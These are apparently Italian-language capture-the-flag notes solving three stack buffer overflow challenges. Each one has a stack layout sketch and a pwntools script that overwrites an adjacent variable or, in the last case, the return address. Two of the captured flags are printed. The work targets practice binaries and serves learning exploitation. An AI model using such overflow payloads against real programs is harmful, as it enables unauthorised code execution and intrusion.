1)no_rop
  STACK:
  	Area libera
  	buffer[8]
  	pass (4Bytes)
  	ptr alla base
  	ind. di ritorno
	
  Se vogliamo sovrascrivere pass basta mandare 8 caratteri casuali (garbage) + un valore che sovrascriva pass.
  	from pwn import *
  	p=process('./no_rop')
  	garbage='A'*8
  	over='1'
  	payload=garbage+over
  	p.sendline(payload)
  	print(p.recvall())
 =>Flag={hello_world_pwn}



2)pwn0
    STACK:
	Area libera
	buffer[64]
	josh[4]
	ptr alla base
	ind. di ritorno
   SCRIPT PY
	from pwn import *
	p=process('./pwn0')
	garbage=b'A'*64
	josh=b"H!gh"
	payload= garbage +josh
	p.sendline(payload)
	p.interactive()

=>encryptCTF{L3t5_R4!53_7h3_J05H}

3)java

	possiamo osservare con gdb che siamo in un'architettura a 64bit
	STACK
	......
	call => 8 B
	buffer [32]
	ptr alla base => 8 B
	ind ritorno => 8 B
	

	from pwn import *
	p=process('./java')
	garbage=b"java" + b'A'*28
	target=p64(0x00000000004007a2)
	
	payload=garbage + target
	p.sendline(payload)
	p.interactive()

  
